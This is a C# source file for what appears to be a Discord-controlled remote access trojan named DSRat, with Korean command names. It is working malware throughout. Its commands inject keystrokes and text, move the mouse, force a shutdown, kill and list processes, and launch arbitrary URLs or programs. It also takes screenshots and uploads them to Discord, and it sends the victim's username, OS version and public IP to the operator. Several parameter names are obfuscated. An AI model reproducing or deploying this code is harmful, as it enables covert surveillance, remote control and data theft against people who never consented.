using Discord.Commands;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Forms;

namespace DSRat
{
    public class Command : ModuleBase<SocketCommandContext>
    {
        [Command("명령어")]
        public async Task help()
        {
            await Context.Channel.SendMessageAsync("``` !키입력 입력할키 \n !컴퓨터종료  \n !마우스이동 x y \n !텍스트입력 \n !화면캡처 \n !웹열기 웹주소 \n !프로세스킬 프로세스이름 \n !상태 \n !프로세스목록\n !메세지박스 할말```");
        }
        [Command("키입력")]
        public async Task KeySendCommand(string keNUSINDKJ7789Hankldsnl3479SIJDHhjky)
        {
            SendKeys.SendWait(keNUSINDKJ7789Hankldsnl3479SIJDHhjky);

            await Context.Channel.SendMessageAsync($"```{keNUSINDKJ7789Hankldsnl3479SIJDHhjky}입력!```");
        }
        [Command("메세지박스")]
        public async Task MessageBoxCommand(string msg)
        {
            System.Windows.Forms.MessageBox.Show(msg);
            await Context.Channel.SendMessageAsync($"```{msg} (을)를 띄움```");
        }
        [Command("컴퓨터종료")]
        public async Task ShutdownCommand()
        {
            System.Diagnostics.Process.Start("shutdown.exe", "-s -f -t 3");
            await Context.Channel.SendMessageAsync("```성공적으로 종료되었습니다```");
        }
        [Command("마우스이동")]
        public async Task MouseCommand(int x, int y)
        {

            Cursor.Position = new Point(x, y);
            await Context.Channel.SendMessageAsync("```마우스 위치를" + x + ", " + y + "으로 이동했습니다```");
        }
        [Command("상태")]
        public async Task onoffCommand()
        {
            await Context.Channel.SendMessageAsync("```켜져있음```");
        }
        [Command("프로세스킬")]

        public async Task ProcesskillCommand(string proprorpasd12BASKHFAJDKBJ23498723893213)
        {
            Process[] processList = Process.GetProcessesByName(proprorpasd12BASKHFAJDKBJ23498723893213);
            if (processList.Length > 0)
            {
                processList[0].Kill();
                await Context.Channel.SendMessageAsync($"```{proprorpasd12BASKHFAJDKBJ23498723893213}를 종료했습니다```");
            }
            else
            {
                await Context.Channel.SendMessageAsync($"```{proprorpasd12BASKHFAJDKBJ23498723893213}가 켜져있지 않습니다```");
            }
        }
        [Command("프로세스목록")]

        public async Task ProcesslistCommand()
        {
            try
            {
                string[] list = new string[100000];
                int i = 0;
                int j = 0;
                string[] send = new string[1000];
                Process[] allProc = Process.GetProcesses();
                await Context.Channel.SendMessageAsync("```--------프로세스-------- (NAME : PID)```");
                foreach (Process p in allProc)
                {
                    list[i] = p.ProcessName + " : " + p.Id + "\n";
                    send[j] += list[i];
                    if (send[j].Length > 2000)
                    {
                        j++;
                    }
                    i++;
                }
                await Context.Channel.SendMessageAsync($"```{send[j]}```");

            }
            catch (Exception e)
            {
                await Context.Channel.SendMessageAsync($"```{e.Message}```");
            }
        }
        [Command("화면캡처")]
        public async Task ScreenShotCommand()
        {
            int width = (int)SystemParameters.PrimaryScreenWidth;
            int height = (int)SystemParameters.PrimaryScreenHeight;

            using (Bitmap bmp = new Bitmap(width, height, PixelFormat.Format32bppArgb))
            {
                using (Graphics gr = Graphics.FromImage(bmp))
                {
                    gr.CopyFromScreen(0, 0, 0, 0, bmp.Size);
                }
                string path = Environment.GetFolderPath(System.Environment.SpecialFolder.MyPictures);
                path += "\\" + DateTime.Now.ToString("yyMMdd_HHmmss") + ".png";

                bmp.Save(path);
                await Context.Channel.SendFileAsync(path);
            }
        }
        [Command("텍스트입력")]
        public async Task TextSendCommand(string tenasdkANFLNL3y9429BSJKDjnsa3141UIJIxt)
        {
            SendKeys.SendWait("{ENTER}");
            SendKeys.SendWait(tenasdkANFLNL3y9429BSJKDjnsa3141UIJIxt);
            SendKeys.SendWait("{ENTER}");

            await Context.Channel.SendMessageAsync($"```{tenasdkANFLNL3y9429BSJKDjnsa3141UIJIxt} 입력!```");
        }
        [Command("웹열기")]
        public async Task WebStartCommand(string sgjsgdojsvnjdsvnjkDNKLJBSDVKLBKLio129329)
        {
            System.Diagnostics.Process.Start(sgjsgdojsvnjdsvnjkDNKLJBSDVKLBKLio129329);
            await Context.Channel.SendMessageAsync($"```{sgjsgdojsvnjdsvnjkDNKLJBSDVKLBKLio129329} 을 열었습니다.```");
        }
        [Command("시스템정보")]
        public async Task SysinfoCommand()
        {
            string IPADDRESS = new WebClient().DownloadString("https://api.ipify.org");
            await Context.Channel.SendMessageAsync($"```사용자이름 : {Environment.UserName} \n운영체제 : {Environment.OSVersion.VersionString} \n아이피 : {IPADDRESS} ```");
        }
    }

}
